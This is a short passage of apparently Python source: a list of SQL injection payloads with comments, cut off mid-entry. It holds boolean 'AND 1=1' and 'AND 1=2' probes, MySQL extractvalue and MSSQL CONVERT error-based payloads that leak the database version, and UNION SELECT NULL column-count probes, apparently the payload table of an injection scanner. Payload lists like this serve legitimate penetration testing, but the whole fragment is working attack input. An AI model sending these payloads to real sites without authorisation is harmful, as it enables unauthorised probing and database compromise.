    ("' AND 1=1--",              2, "error",      "true condition - should return normal page"),
    ("' AND 1=2--",              2, "error",      "false condition - page should look different"),
    ("' AND extractvalue(1,concat(0x7e,version()))--",
                                 2, "error",      "MySQL: force error that leaks DB version"),
    ("1 AND 1=CONVERT(int,@@version)--",
                                 2, "error",      "MSSQL: type conversion error leaks version"),
    ("' UNION SELECT NULL--",    2, "error",      "UNION probe - 1 column guess"),
    ("' UNION SELECT NULL,NULL--",
